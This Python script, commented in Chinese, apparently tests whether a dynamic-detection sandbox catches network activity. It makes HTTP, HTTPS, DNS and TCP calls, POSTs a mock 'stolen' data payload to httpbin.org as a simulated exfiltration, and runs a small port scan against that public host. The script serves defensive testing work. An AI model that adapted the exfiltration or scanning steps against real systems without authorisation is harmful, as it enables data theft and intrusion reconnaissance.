#!/usr/bin/env python3
"""
网络活动测试用例 - 执行各种网络操作
用于测试动态检测系统能否捕获网络行为
"""

import socket
import urllib.request
import urllib.error

print("[开始] 网络活动测试")

# 1. HTTP GET 请求
print("[1] urllib HTTP GET - httpbin.org")
try:
    response = urllib.request.urlopen("http://httpbin.org/get", timeout=5)
    print(f"  -> Status: {response.status}")
except Exception as e:
    print(f"  -> Error: {e}")

# 2. HTTPS 请求
print("[2] urllib HTTPS - httpbin.org")
try:
    response = urllib.request.urlopen("https://httpbin.org/get", timeout=5)
    print(f"  -> Status: {response.status}")
except Exception as e:
    print(f"  -> Error: {e}")

# 3. HTTP POST
print("[3] HTTP POST - 数据外传模拟")
try:
    import json
    data = json.dumps({"stolen": "data"}).encode()
    req = urllib.request.Request(
        "http://httpbin.org/post",
        data=data,
        headers={"Content-Type": "application/json"}
    )
    response = urllib.request.urlopen(req, timeout=5)
    print(f"  -> Status: {response.status}")
except Exception as e:
    print(f"  -> Error: {e}")

# 4. DNS 查询
print("[4] DNS 查询 - google.com")
try:
    ip = socket.gethostbyname("google.com")
    print(f"  -> {ip}")
except Exception as e:
    print(f"  -> Error: {e}")

# 5. socket TCP 连接
print("[5] socket TCP 连接 - httpbin.org:80")
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    sock.connect(("httpbin.org", 80))
    print(f"  -> Connected")
    sock.close()
except Exception as e:
    print(f"  -> Error: {e}")

# 6. 端口扫描模拟
print("[6] 端口扫描 - httpbin.org")
target = "httpbin.org"
ports = [21, 22, 80, 443, 8080]
for port in ports:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        status = "open" if result == 0 else "closed"
        print(f"  -> Port {port}: {status}")
        sock.close()
    except:
        pass

# 7. requests 库（如果可用）
print("[7] requests 库测试")
try:
    import requests
    resp = requests.get("http://httpbin.org/get", timeout=5)
    print(f"  -> Status: {resp.status_code}")
except ImportError:
    print(f"  -> requests 未安装，跳过")
except Exception as e:
    print(f"  -> Error: {e}")

print("[完成] 网络活动测试")
